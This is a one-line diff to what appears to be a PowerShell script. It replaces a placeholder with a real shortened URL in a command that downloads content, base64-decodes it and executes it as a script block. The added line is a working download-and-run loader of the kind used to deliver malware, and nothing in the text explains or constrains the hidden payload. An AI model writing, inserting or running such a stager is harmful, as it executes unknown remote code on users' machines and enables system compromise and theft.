@@ -1,1 +1,1 @@
-Invoke-Command -ScriptBlock ([ScriptBlock]::Create(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((Invoke-WebRequest -Uri 'https://tinyurl.com/???' -UseBasicParsing).Content).ToString())))))
+Invoke-Command -ScriptBlock ([ScriptBlock]::Create(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((Invoke-WebRequest -Uri 'https://tinyurl.com/4n4fjym4' -UseBasicParsing).Content).ToString())))))
